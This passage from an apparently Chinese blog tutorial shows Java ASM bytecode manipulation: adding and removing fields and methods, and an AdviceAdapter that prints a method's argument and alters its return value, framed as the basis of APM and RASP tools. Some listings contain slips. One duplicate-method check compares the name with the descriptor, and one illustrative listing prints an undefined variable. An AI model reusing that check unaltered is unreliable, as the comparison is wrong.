51);">。</font></p><h5 id="添加-删除Field"><a href="#添加-删除Field" class="headerlink" title="添加&amp;删除Field"></a>添加&amp;删除Field</h5><ul><li>访问者类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMUpdateFieldClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String deleteFieldName;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> addFieldAccess;</span><br><span class="line">    <span class="keyword">private</span> String addFieldName;</span><br><span class="line">    <span class="keyword">private</span> String addFieldDesc;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ASMUpdateFieldClassVisitor</span><span class="params">(ClassVisitor classVisitor, String deleteFieldName, <span class="type">int</span> addFieldAccess, String addFieldName, String addFieldDesc)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(Opcodes.ASM5, classVisitor);</span><br><span class="line">        <span class="built_in">this</span>.deleteFieldName = deleteFieldName;</span><br><span class="line">        <span class="built_in">this</span>.addFieldAccess = addFieldAccess;</span><br><span class="line">        <span class="built_in">this</span>.addFieldName = addFieldName;</span><br><span class="line">        <span class="built_in">this</span>.addFieldDesc = addFieldDesc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String descriptor, String signature, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(deleteFieldName)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(addFieldName)) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, descriptor, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">            <span class="type">FieldVisitor</span> <span class="variable">fieldVisitor</span> <span class="operator">=</span> <span class="built_in">super</span>.visitField(addFieldAccess, addFieldName, addFieldDesc, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (fieldVisitor != <span class="literal">null</span>) &#123;</span><br><span class="line">                fieldVisitor.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>主类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMUpdateFieldMain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/asm/demo/BytecodeTest.class&quot;</span>);</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(classReader, ClassWriter.COMPUTE_FRAMES);</span><br><span class="line"></span><br><span class="line">        <span class="type">ASMUpdateFieldClassVisitor</span> <span class="variable">asmUpdateFieldClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ASMUpdateFieldClassVisitor</span>(classWriter, <span class="string">&quot;age&quot;</span>, Opcodes.ACC_PRIVATE, <span class="string">&quot;sex&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">        classReader.accept(asmUpdateFieldClassVisitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/asm/demo/BytecodeUpdateFieldTest.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] updateByte = classWriter.toByteArray();</span><br><span class="line">        fileOutputStream.write(updateByte);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ASMClassVisitor</span> <span class="variable">asmClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ASMClassVisitor</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(updateByte);</span><br><span class="line">        System.out.println(<span class="string">&quot;解析类名: &quot;</span> + reader.getClassName() + <span class="string">&quot;，父类: &quot;</span> + reader.getSuperName() + <span class="string">&quot;，实现接口: &quot;</span> + Arrays.toString(reader.getInterfaces()));</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        reader.accept(asmClassVisitor, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708181575896-71234150-f524-48e1-b3e3-ea7bf3e1da1e.png"></p><h5 id="添加-删除Method"><a href="#添加-删除Method" class="headerlink" title="添加&amp;删除Method"></a>添加&amp;删除Method</h5><ul><li>访问者类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMUpdateMethodClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String deleteMethodName;</span><br><span class="line">    <span class="keyword">private</span> String deleteMethodDesc;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> addMethodAccess;</span><br><span class="line">    <span class="keyword">private</span> String addMethodName;</span><br><span class="line">    <span class="keyword">private</span> String addMethodDesc;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ASMUpdateMethodClassVisitor</span><span class="params">(ClassVisitor classVisitor, String deleteMethodName, String deleteMethodDesc, <span class="type">int</span> addMethodAccess, String addMethodName, String addMethodDesc)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(Opcodes.ASM5, classVisitor);</span><br><span class="line">        <span class="built_in">this</span>.deleteMethodName = deleteMethodName;</span><br><span class="line">        <span class="built_in">this</span>.deleteMethodDesc = deleteMethodDesc;</span><br><span class="line">        <span class="built_in">this</span>.addMethodAccess = addMethodAccess;</span><br><span class="line">        <span class="built_in">this</span>.addMethodName = addMethodName;</span><br><span class="line">        <span class="built_in">this</span>.addMethodDesc = addMethodDesc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String descriptor, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(deleteMethodName) &amp;&amp; descriptor.equals(deleteMethodDesc)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(addMethodName) &amp;&amp; name.equals(addMethodDesc)) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">            <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(addMethodAccess, addMethodName, addMethodDesc, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (methodVisitor != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 访问方法的字节码</span></span><br><span class="line">                methodVisitor.visitCode();</span><br><span class="line">                <span class="comment">// 添加return指令</span></span><br><span class="line">                methodVisitor.visitInsn(Opcodes.RETURN);</span><br><span class="line">                <span class="comment">// 设置方法的最大操作数栈深度和最大局部变量表大小，空方法设置00即可</span></span><br><span class="line">                methodVisitor.visitMaxs(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                methodVisitor.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>主类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMUpdateMethodMain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/asm/demo/BytecodeTest.class&quot;</span>);</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(classReader, ClassWriter.COMPUTE_FRAMES);</span><br><span class="line"></span><br><span class="line">        <span class="type">ASMUpdateMethodClassVisitor</span> <span class="variable">asmUpdateMethodClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ASMUpdateMethodClassVisitor</span>(classWriter, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;()V&quot;</span>, Opcodes.ACC_PUBLIC, <span class="string">&quot;newMethod&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">        classReader.accept(asmUpdateMethodClassVisitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/asm/demo/BytecodeUpdateMethodTest.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] updateByte = classWriter.toByteArray();</span><br><span class="line">        fileOutputStream.write(updateByte);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ASMClassVisitor</span> <span class="variable">asmClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ASMClassVisitor</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(updateByte);</span><br><span class="line">        System.out.println(<span class="string">&quot;解析类名: &quot;</span> + reader.getClassName() + <span class="string">&quot;，父类: &quot;</span> + reader.getSuperName() + <span class="string">&quot;，实现接口: &quot;</span> + Arrays.toString(reader.getInterfaces()));</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        reader.accept(asmClassVisitor, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708185647344-9b8f473c-b33b-47ec-8c24-31b25c696af8.png"></p><h5 id="修改方法指令"><a href="#修改方法指令" class="headerlink" title="修改方法指令"></a>修改方法指令</h5><p><font style="color:rgb(51, 51, 51);">大多数使用</font><font style="color:rgb(51, 51, 51);">ASM</font><font style="color:rgb(51, 51, 51);">库的目的其实是修改类方法的字节码，在原方法执行的前后动态插入新的</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">代码，从而实现类似于</font><font style="color:rgb(51, 51, 51);">AOP</font><font style="color:rgb(51, 51, 51);">的功能。修改类方法字节码的典型应用场景如：</font><font style="color:rgb(51, 51, 51);">APM</font><font style="color:rgb(51, 51, 51);">和</font><font style="color:rgb(51, 51, 51);">RASP</font><font style="color:rgb(51, 51, 51);">；</font><font style="color:rgb(51, 51, 51);">APM</font><font style="color:rgb(51, 51, 51);">需要统计和分析每个类方法的执行时间，而</font><font style="color:rgb(51, 51, 51);">RASP</font><font style="color:rgb(51, 51, 51);">需要在</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">底层</font><font style="color:rgb(51, 51, 51);">API</font><font style="color:rgb(51, 51, 51);">方法执行之前插入自身的检测代码，从而实现动态拦截恶意攻击。</font></p><p><font style="color:rgb(51, 51, 51);">假设我们需要修改</font><font style="color:#080808;">org.example.asm.demo</font>.<font style="color:#080808;">BytecodeTest</font><font style="color:rgb(51, 51, 51);">类的</font><font style="color:rgb(51, 51, 51);">process</font><font style="color:rgb(51, 51, 51);">方法，实现以下两个需求：</font></p><ol><li><font style="color:rgb(51, 51, 51);">在原业务逻辑执行前打印出该方法的参数值</font></li><li><font style="color:rgb(51, 51, 51);">修改该方法的返回值</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改前业务逻辑</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">process</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> str + name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改后业务逻辑</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">process</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(var1);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot;RASP is so cool!&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> str + name;</span><br><span class="line">    System.out.println(var4);</span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.commons.AdviceAdapter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMModMethodAdapterMain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/asm/demo/BytecodeTest.class&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建ClassReader对象, 用于解析类对象，可以根据类名、二进制、输入流的方式创建</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);</span><br><span class="line">            <span class="comment">// 创建ClassWriter对象, COMPUTE_FRAMES会自动计算max_stack和max_locals</span></span><br><span class="line">            <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(classReader, ClassWriter.COMPUTE_FRAMES);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用自定义的ClassVisitor访问者对象, 访问该类文件的结构</span></span><br><span class="line">            classReader.accept(<span class="keyword">new</span> <span class="title class_">ClassVisitor</span>(Opcodes.ASM9, classWriter) &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (name.equals(<span class="string">&quot;process&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 创建自定义的MethodVisitor, 修改原方法的字节码</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AdviceAdapter</span>(api, mv, access, name, desc) &#123;</span><br><span class="line">                            <span class="type">int</span> newArgIndex;</span><br><span class="line">                            <span class="comment">// 获取String的ASM Type对象</span></span><br><span class="line">                            <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Type</span> <span class="variable">stringType</span> <span class="operator">=</span> Type.getType(String.class);</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onMethodEnter</span><span class="params">()</span> &#123;</span><br><span class="line">                                <span class="comment">// 输出process方法的第一个参数, 因为process是非static方法, 所以0是this, 第一个参数的下标应该是1</span></span><br><span class="line">                                mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">                                mv.visitVarInsn(ALOAD, <span class="number">1</span>);</span><br><span class="line">                                mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 创建一个新的局部变量, newLocal会计算出这个新局部对象的索引位置</span></span><br><span class="line">                                newArgIndex = newLocal(stringType);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 压入字符串到栈顶</span></span><br><span class="line">                                mv.visitLdcInsn(<span class="string">&quot;RASP is so cool!&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 将&quot;RASP is so cool!&quot;字符串压入到新生成的局部变量中, String var2 = &quot;RASP is so cool!&quot;;</span></span><br><span class="line">                                storeLocal(newArgIndex, stringType);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onMethodExit</span><span class="params">(<span class="type">int</span> opcode)</span> &#123;</span><br><span class="line">                                <span class="comment">// 复制栈顶的返回值</span></span><br><span class="line">                                dup();</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 创建一个新的局部变量, 并获取索引位置</span></span><br><span class="line">                                <span class="type">int</span> <span class="variable">returnValueIndex</span> <span class="operator">=</span> newLocal(stringType);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 将栈顶的返回值压入新生成的局部变量中</span></span><br><span class="line">                                storeLocal(returnValueIndex, stringType);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 输出process方法的返回值</span></span><br><span class="line">                                mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">                                mv.visitVarInsn(ALOAD, returnValueIndex);</span><br><span class="line">                                mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span 